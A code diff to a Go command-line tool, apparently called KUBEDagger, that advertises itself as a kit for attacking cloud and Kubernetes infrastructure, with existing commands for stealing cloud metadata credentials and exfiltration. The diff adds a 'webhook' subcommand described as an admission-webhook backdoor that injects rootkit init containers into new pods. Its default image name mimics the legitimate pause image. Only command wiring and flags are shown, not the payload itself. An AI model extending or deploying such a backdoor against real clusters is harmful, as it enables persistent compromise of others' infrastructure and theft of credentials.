@@ -176,6 +176,13 @@ var cmdCloud = &cobra.Command{
 	Long:  "cloud provides tools for attacking cloud provider infrastructure (AWS, GCP, Azure)",
 }
 
+var cmdWebhook = &cobra.Command{
+	Use:   "webhook",
+	Short: "admission webhook backdoor",
+	Long:  "webhook deploys a mutating admission webhook that injects rootkit init containers into new pods",
+	RunE:  webhookCmd,
+}
+
 var cmdCloudMeta = &cobra.Command{
 	Use:   "meta",
 	Short: "steal cloud metadata credentials",
@@ -621,4 +628,27 @@ func init() {
 	cmdCloud.AddCommand(cmdCloudMeta)
 	cmdCloud.AddCommand(cmdCloudExfil)
 	KUBEDaggerClient.AddCommand(cmdCloud)
+
+	cmdWebhook.PersistentFlags().StringVar(
+		&options.WebhookAction,
+		"action",
+		"deploy",
+		"webhook action: deploy or remove")
+	cmdWebhook.PersistentFlags().StringVar(
+		&options.WebhookNamespace,
+		"namespace",
+		"default",
+		"target namespace for webhook")
+	cmdWebhook.PersistentFlags().StringVar(
+		&options.WebhookImage,
+		"image",
+		"k8s.gcr.io/pause:3.9-init",
+		"init container image to inject")
+	cmdWebhook.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdWebhook)
 }
